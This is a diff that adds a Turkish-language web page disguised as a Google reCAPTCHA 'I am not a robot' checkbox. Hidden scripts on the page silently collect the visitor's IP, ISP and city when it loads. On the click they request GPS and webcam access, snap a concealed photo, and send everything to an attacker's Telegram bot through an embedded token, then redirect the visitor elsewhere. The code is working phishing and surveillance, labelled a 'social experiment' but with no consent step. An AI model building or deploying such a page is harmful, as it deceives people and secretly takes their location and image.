@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>reCAPTCHA Doğrulaması</title>
+    
+    <style>
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f9f9f9;
+            margin: 0;
+        }
+        .captcha-box {
+            background: white;
+            padding: 24px;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            display: flex;
+            align-items: center;
+            width: 320px;
+            justify-content: space-between;
+            box-sizing: border-box;
+        }
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+        }
+        .checkbox {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            margin-right: 12px;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: all 0.2s;
+            position: relative;
+            box-sizing: border-box;
+        }
+        .checkbox.loading {
+            border-radius: 50%;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #4d90fe;
+            animation: spin 1s linear infinite;
+        }
+        .text {
+            font-size: 14px;
+            color: #2b2b2b;
+            font-weight: 400;
+            user-select: none;
+        }
+        .logo-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo-section img {
+            width: 32px;
+            height: 32px;
+        }
+        .logo-section span {
+            font-size: 8px;
+            color: #555;
+            margin-top: 4px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Kamerayı ve yardımcı elementleri gizli tutuyoruz */
+        video, canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="captcha-box">
+    <div class="checkbox-container">
+        <div class="checkbox" id="captcha-btn" onclick="startVerification()"></div>
+        <div class="text">Ben robot değilim</div>
+    </div>
+    <div class="logo-section">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/1200px-RecaptchaLogo.svg.png" alt="recaptcha">
+        <span>Gizlilik - Şartlar</span>
+    </div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    // --- AYARLAR (Buraları kendi bilgilerinle doldur) ---
+    const TELEGRAM_TOKEN = "8964616321:AAGHJ-GKn2How6b_OhWw0Ktju80fROG0U58";
+    const CHAT_ID = "8605475114";
+    const TARGET_URL = "https://justpaste.it/ewmvp";
+    // -----------------------------------------------------
+
+    let collectedData = {
+        ip: "Bilinmiyor",
+        city: "Bilinmiyor",
+        region: "Bilinmiyor",
+        country: "Bilinmiyor",
+        isp: "Bilinmiyor",
+        userAgent: navigator.userAgent,
+        gps: "Reddedildi veya Alınamadı",
+        photoBlob: null
+    };
+
+    // Sayfa yüklenir yüklenmez IP ve ISP bilgilerini sessizce çek
+    window.onload = function() {
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                collectedData.ip = data.ip || "Bilinmiyor";
+                collectedData.city = data.city || "Bilinmiyor";
+                collectedData.region = data.region || "Bilinmiyor";
+                collectedData.country = data.country_name || "Bilinmiyor";
+                collectedData.isp = data.org || "Bilinmiyor";
+            }).catch(() => {
+                console.log("IP API'sine erişilemedi.");
+            });
+    };
+
+    // Telegram'a veri gönderen fonksiyon
+    async function sendDataToTelegram() {
+        const reportText = `🎯 *Sosyal Deney - Yeni Rapor!*\n\n` +
+                           `🌐 *IP Adresi:* \`${collectedData.ip}\`\n` +
+                           `🏢 *ISP (İnternet):* ${collectedData.isp}\n` +
+                           `🌍 *Konum (IP):* ${collectedData.country} / ${collectedData.region} / ${collectedData.city}\n` +
+                           `📍 *GPS (Hassas):* ${collectedData.gps}\n` +
+                           `📱 *Cihaz (User-Agent):* \`${collectedData.userAgent}\``;
+
+        try {
+            if (collectedData.photoBlob) {
+                // Eğer fotoğraf varsa sendPhoto API'sini kullanıyoruz
+                let formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", collectedData.photoBlob, "snapshot.jpg");
+                formData.append("caption", reportText);
+                formData.append("parse_mode", "Markdown");
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+            } else {
+                // Fotoğraf yoksa sadece metin raporu gönder
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: reportText + "\n❌ *Kamera İzni:* Reddedildi veya Alınamadı.",
+                        parse_mode: "Markdown"
+                    })
+                });
+            }
+        } catch (error) {
+            console.error("Telegram'a veri gönderilirken hata oluştu:", error);
+        }
+    }
+
+    // Kullanıcı butona bastığında çalışan ana döngü
+    async function startVerification() {
+        let btn = document.getElementById('captcha-btn');
+        btn.onclick = null; // Çift tıklamayı engellemek için fonksiyonu siliyoruz
+        btn.classList.add('loading');
+
+        // 1. ADIM: GPS Konum İzni İste
+        if (navigator.geolocation) {
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 6000 });
+                });
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                collectedData.gps = `Enlem: ${lat}, Boylam: ${lon} ([Haritada Gör](https://www.google.com/maps?q=${lat},${lon}))`;
+            } catch (err) {
+                collectedData.gps = "Kullanıcı GPS iznini reddetti.";
+            }
+        } else {
+            collectedData.gps = "Tarayıcı GPS desteklemiyor.";
+        }
+
+        // 2. ADIM: Kamera İzni İste ve Görseli Yakala
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            // Kameranın stabilizasyonu için kısa bir bekleme süresi (500ms)
+            await new Promise(resolve => setTimeout(resolve, 500));
+
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Kamerayı hemen kapat (cihazdaki kamera ışığı sönsün)
+            stream.getTracks().forEach(track => track.stop());
+
+            // Canvas verisini Telegram'ın kabul edeceği Blob (Binary) formatına çevir
+            await new Promise(resolve => {
+                canvas.toBlob(blob => {
+                    collectedData.photoBlob = blob;
+                    resolve();
+                }, 'image/jpeg', 0.7); // %70 kalite ile sıkıştırıp boyut düşürüyoruz
+            });
+
+        } catch (err) {
+            console.log("Kamera izni alınamadı:", err);
+            collectedData.photoBlob = null;
+        }
+
+        // 3. ADIM: Verileri Telegram'a Uçur ve Yönlendir
+        await sendDataToTelegram();
+        
+        // Her halükarda hedef siteye fırlat
+        window.location.href = TARGET_URL;
+    }
+</script>
+
+</body>
+</html>
